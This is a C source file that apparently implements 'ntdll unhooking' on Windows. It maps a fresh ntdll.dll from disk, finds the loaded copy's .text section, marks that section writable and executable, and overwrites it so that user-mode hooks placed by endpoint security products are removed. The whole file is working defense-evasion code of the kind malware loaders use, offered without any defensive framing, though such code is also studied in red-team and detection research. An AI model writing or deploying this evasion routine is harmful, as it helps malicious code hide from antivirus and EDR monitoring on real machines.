#include <Windows.h>
#include <stdio.h>

BOOL mapNtdllFromDisk(PVOID* out) {

    CHAR    cWinPath[MAX_PATH / 2] = { 0 };
    CHAR    cNtdllPath[MAX_PATH] = { 0 };
    PBYTE   pNtdllBuffer = NULL;

    // getting %SYSTEMROOT%
    if (GetWindowsDirectoryA(cWinPath, sizeof(cWinPath)) == 0) {
        printf("[!] GetWindowsDirectoryA Failed With Error : %d \n", GetLastError());
    }

    // 'sprintf_s' is a more secure version than 'sprintf'
    sprintf_s(cNtdllPath, sizeof(cNtdllPath), "%s\\System32\\%s", cWinPath, "ntdll.dll");



    // Get a handle to ntdll from disk
    HANDLE hFile = CreateFileA(cNtdllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[!] Failed to open a handle to the file. Erro: %u\n", GetLastError());
        return FALSE;
    }

    // Open a file mapping object for ntdll
    HANDLE hmapping = CreateFileMappingNumaW(hFile, NULL, PAGE_READONLY | SEC_IMAGE, NULL, NULL, NULL, NUMA_NO_PREFERRED_NODE);
    if (!hmapping) {
        CloseHandle(hFile);
        return FALSE;
    }

   

    // Maps a view of a file mapping into the address space ( avoid to to realign offsets )
    LPVOID pNtdll = MapViewOfFileExNuma(hmapping, FILE_MAP_READ, NULL, NULL, NULL, NULL, NUMA_NO_PREFERRED_NODE);
    if (!pNtdll) {
        CloseHandle(hFile);
        CloseHandle(hmapping);
        return FALSE;
    }

    *out = pNtdll;

    return TRUE;

}


BOOL getOGTxtSection(HANDLE hmodule, OUT SIZE_T* szNtdllTxt, OUT PVOID* plocalntdllsection) {

    PIMAGE_DOS_HEADER	pLocalDosHdr = (PIMAGE_DOS_HEADER)hmodule;
    if (pLocalDosHdr->e_magic != IMAGE_DOS_SIGNATURE) {
        return FALSE;
    }

    PIMAGE_NT_HEADERS 	pLocalNtHdrs = (PIMAGE_NT_HEADERS)((PBYTE)hmodule  + pLocalDosHdr->e_lfanew);
    if (pLocalNtHdrs->Signature != IMAGE_NT_SIGNATURE){
        return FALSE;
    }

    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pLocalNtHdrs);

    for (int i = 0; i < pLocalNtHdrs->FileHeader.NumberOfSections; i++)
    {

        if ( strcmp((const char*)pSectionHeader[i].Name, ".text") == 0 ) 
        {
            PVOID pLocalNtdllTxt = (PVOID)((ULONG_PTR)hmodule + pSectionHeader[i].VirtualAddress);
            SIZE_T sNtdllTxtSize = pSectionHeader[i].Misc.VirtualSize;
            *szNtdllTxt = sNtdllTxtSize;
            *plocalntdllsection = pLocalNtdllTxt;
            break;
        }
    }

    return TRUE;

}



BOOL Unhook() {


    PVOID hNtdllFromDisk = NULL;
    if (mapNtdllFromDisk(&hNtdllFromDisk) == FALSE) {
        printf("[!] Error mapping NTDLL from disk. Error: %u\n", GetLastError());
        return FALSE;
    }
    if (!hNtdllFromDisk) {
        printf("[!] Failed to get pointer to NTDLL from disk. Error: %lu\n", GetLastError());
        return FALSE;
    }
    PVOID hNgNtdll = (PVOID)((ULONG_PTR)hNtdllFromDisk + 4096);


    SIZE_T szNtdllTxt = NULL;
    LPVOID hOgNtdll = NULL;
    getOGTxtSection(GetModuleHandle(L"ntdll.dll"), &szNtdllTxt, &hOgNtdll);



    if (!hNgNtdll || !hOgNtdll || !szNtdllTxt) {
        printf("[!] Missing Info\n");
        return FALSE;
    }

    printf("hNgNtdll at 0x%p || hOgNtdll at 0x%p || szNtdllTxt of size %u\n", hNgNtdll, hOgNtdll, szNtdllTxt);


    DWORD dwOldProtection = NULL;

        // making the text section writable and executable
    if (!VirtualProtect(hOgNtdll, szNtdllTxt, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        printf("[-] VirtualProtect [1] Failed .Error : %d \n", GetLastError());
        return FALSE;
    }

    // copying the new text section
    memcpy(hOgNtdll, hNgNtdll, szNtdllTxt);

    // rrestoring the old memory protection
    if (!VirtualProtect(hOgNtdll, szNtdllTxt, dwOldProtection, &dwOldProtection)) {
        printf("[-] VirtualProtect [2] Failed. Error : %d \n", GetLastError());
        return FALSE;
    }



    return TRUE;

}

